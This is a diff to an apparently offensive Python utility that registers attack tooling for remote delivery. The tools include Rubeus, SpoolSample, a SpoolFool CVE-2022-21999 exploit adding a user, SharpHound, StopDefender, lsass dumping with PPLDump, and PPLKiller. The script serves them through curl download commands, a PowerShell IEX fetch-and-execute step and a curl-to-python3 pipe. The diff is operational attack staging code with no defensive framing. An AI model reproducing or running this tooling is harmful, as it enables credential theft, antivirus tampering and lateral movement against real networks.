@@ -409,7 +409,7 @@ def pandora(Tname, shellUrl=shellcode_url, Tvar=None, desc=None, pscmdType='raw'
 
 # easy-to-use-utility
 def simple(filepath, desc=None):
-    desc = desc or filepath
+    desc = desc or os.path.basename(filepath)
     command = 'curl %s' % TempUtil.getFileUrl(filepath)
     wlmgr.add('[Simple] %s' % desc, '', command)
 
@@ -451,15 +451,13 @@ pandora('cs-2')
 pandora('cs-3')
 pandora('vb-1')
 
-cs_exe('Rubeus.exe', 'Rubeus')
-cs_exe('SpoolSample.exe', 'SpoolSample', 'SpoolSample.SpoolSample')
-cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
-cs_exe('myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 
-        'myPsExec.Program')
-#cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
-cs_exe('SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
-cs_exe('SharpHound.exe', 'Invoke-Bloodhound -c "All,GPOLocalGroup" --outputdirectory $env:tmp -s -Domain xxx.com', 
+cs_exe('thirdparty_libs/Rubeus.exe', 'Rubeus')
+cs_exe('thirdparty_libs/SpoolSample.exe', 'Invoke-SpoolSample <victim> <attacker>', 'SpoolSample.SpoolSample')
+cs_exe('thirdparty_libs/SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
+cs_exe('thirdparty_libs/SharpHound.exe', 'Invoke-Bloodhound -c "All,GPOLocalGroup" --outputdirectory $env:tmp -s -Domain xxx.com', 
         'SharpHound.Program', 'Invoke-Bloodhound')
+cs_exe('myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 'myPsExec.Program')
+cs_exe('SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
 
 for common_psmodule in app['common-pstool']:
     c = ''
@@ -472,7 +470,7 @@ for common_psmodule in app['common-pstool']:
             postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc=common_psmodule['name'])
 
 
-c_exe('StopDefender.exe', 'StopDefender')
+c_exe('thirdparty_libs/StopDefender.exe', 'StopDefender')
 #c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
 
 for huan_exe in glob.glob('./artifact/*.exe'):
@@ -481,11 +479,11 @@ for huan_exe in glob.glob('./artifact/*.exe'):
 # Map Failed when using Invoke-RPEI
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='raw')
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='enc')
-simple('PPLDump.exe', 'PPLDump.exe')
-simple('SysinternalsSuite_PsExec.exe', 'PsExec.exe')
-simple('linikatz.sh')
-simple('BackStab.exe')
-simple('PPLKiller.exe')
+simple('thirdparty_libs/PPLDump.exe', 'PPLDump.exe')
+simple('thirdparty_libs/SysinternalsSuite_PsExec.exe', 'PsExec.exe')
+simple('thirdparty_libs/linikatz.sh')
+simple('thirdparty_libs/BackStab.exe')
+simple('thirdparty_libs/PPLKiller.exe')
 
 pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
